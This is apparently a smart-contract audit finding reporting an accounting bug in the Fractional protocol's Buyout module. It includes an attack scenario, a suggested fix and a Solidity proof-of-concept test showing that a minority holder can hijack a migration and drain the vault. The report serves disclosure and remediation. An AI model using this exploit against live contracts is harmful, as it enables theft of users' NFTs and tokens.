# Vulnerability details

## Impact
Winning all Migration Proposals, stealing NFTs and burning all fractional tokens from users.

## Description
Let's have an overview on what can happen, step by step. Then let's see where is the accounting bug that allows for this. And finally, there's a fully functional PoC that can be added as a test unit.

### What can happen
Imagine this scenario:

There's a Vault with 4 users:
- `Batman` (good user with TOTAL_SUPPLY/4 fractional tokens) 
- `Robin` (good user with TOTAL_SUPPLY/4 fractional tokens)
- `Superman` (good user with TOTAL_SUPPLY/4 fractional tokens)
- `Jocker` (a hacker with TOTAL_SUPPLY/5 fractional tokens - less tokens than any other user)

`Batman` decides to add new modules to the vault so the following happens:

1- `Batman` creates a Migration Proposal and joins his own proposal with all of his fractional tokens.

2- `Robin` and `Superman` join Batman's this proposal with all of their own Fractional tokens and almost all of their ETH, to support the migration and make sure it get's done.

3- `Joker` quickly creates an evil Migration Proposal with modules that steal all NFTs, joins his own proposal, and `commit()` it.

Due to an accounting bug, all fractional tokens (Batman's, Robin's and Superman's tokens) will go to the `Buyout` module instead of only the ones that `Jocker` deposited, and they will all count towards the 51% of needed for a proposal to succeed. There's over 95% of the total supply of fractional tokens in `Joker` proposal now!

4- After the `rejectionPeriod`, `Joker` calls `end()` to successfully end the proposal, and calls `migrateVaultERC20`, `migrateVaultERC721` and `migrateVaultERC1155` to migrate everything to a new Vault with evil modules installed.

Trying to stop this migration would cost a lot of ETH, as users have to buy almost 50% of the fractional tokens. And if they attempt to create a new legit proposal, the attack can be repeated.

### Why it happens | Suggested Fix
In this line https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L73 the algorithm counts the total balance of fractional tokens in the `Migration` module, he instead should only count the balance of `Joker`'s proposal.

You can send this value in a parameter, for example. There's many ways to fix this.

## Proof of Concept
Add this as a new unit tests:
```
// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;
import "./TestUtil.sol";
contract BaseVaultTest is TestUtil {

    // G00D USERS
    User batman;
    User robin;
    User superman;

    // HACKER
    User joker;

    // Prepare the stage :)
    function initMigration() public {

        deployBaseVault(batman, TOTAL_SUPPLY);
        (token, tokenId) = registry.vaultToToken(vault);
        batman.ferc1155 = new FERC1155BS(address(0), 111, token);
        robin.ferc1155 = new FERC1155BS(address(0), 222, token);
        superman.ferc1155 = new FERC1155BS(address(0), 333, token);
        joker.ferc1155 = new FERC1155BS(address(0), 444, token);

        mockModule = new MockModule();
        buyout = address(buyoutModule);
        migration = address(migrationModule);
        proposalPeriod = buyoutModule.PROPOSAL_PERIOD();
        rejectionPeriod = buyoutModule.REJECTION_PERIOD();

        batman.ferc1155.safeTransferFrom(batman.addr, robin.addr, 1, TOTAL_SUPPLY/4, "");
        batman.ferc1155.safeTransferFrom(batman.addr, superman.addr, 1, TOTAL_SUPPLY/4, "");
        batman.ferc1155.safeTransferFrom(batman.addr, joker.addr, 1, TOTAL_SUPPLY/4, "");

        setApproval(batman, vault, true);
        setApproval(batman, migration, true);
        setApproval(robin, vault, true);
        setApproval(robin, migration, true);
        setApproval(superman, vault, true);
        setApproval(superman, migration, true);
        setApproval(joker, vault, true);
        setApproval(joker, migration, true);
    }

    // init everything
    function setUp() public {
        setUpContract();
        batman = setUpUser(111, 1);
        robin = setUpUser(222, 2);
        superman = setUpUser(333, 3);
        joker = setUpUser(444, 4);

        initMigration();
    }

    function testAttack() public {

        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();

        // Migrate to a vault with no permissions (just to test out migration)
        address[] memory modules = new address[](1);
        modules[0] = address(mockModule);

        // Batman makes the proposal
        batman.migrationModule.propose(vault,modules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2, 1 ether);
        // Batman joins the proposal
        batman.migrationModule.join{value: 90 ether}(vault, 1, TOTAL_SUPPLY/4);
        // Robin joins the proposalrejectionPeriod
        robin.migrationModule.join{value: 90 ether}(vault, 1, TOTAL_SUPPLY/4);
        // Superman joins the proposal
        superman.migrationModule.join{value: 90 ether}(vault, 1, TOTAL_SUPPLY/4);

        // migration balance is 7500
        assertEq(batman.ferc1155.balanceOf(migration,1), 7500);

        // joker attacks!!
        joker.migrationModule.propose(vault,modules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2, 0 ether);
        joker.migrationModule.join{value: 1 ether}(vault, 2, TOTAL_SUPPLY/5);
        bool started = joker.migrationModule.commit(vault, 2);
        assertTrue(started);

        // migration balance is 0
        assertEq(batman.ferc1155.balanceOf(migration,1), 0);
        // everything was sent to buyout
        assertEq(batman.ferc1155.balanceOf(buyout,1), 9500);

        vm.warp(rejectionPeriod + 1);

        // ended successfully!
        joker.buyoutModule.end(vault, burnProof);

        // 0 tokens and ready to migrate
        assertEq(batman.ferc1155.balanceOf(migration,1), 0);
        assertEq(batman.ferc1155.balanceOf(batman.addr,1), 0);
        assertEq(batman.ferc1155.balanceOf(robin.addr,1), 0);
        assertEq(batman.ferc1155.balanceOf(superman.addr,1), 0);

        // call `migrateVaultERC20`, `migrateVaultERC721` and `migrateVaultERC1155`
        // to migrate everything

    }
}

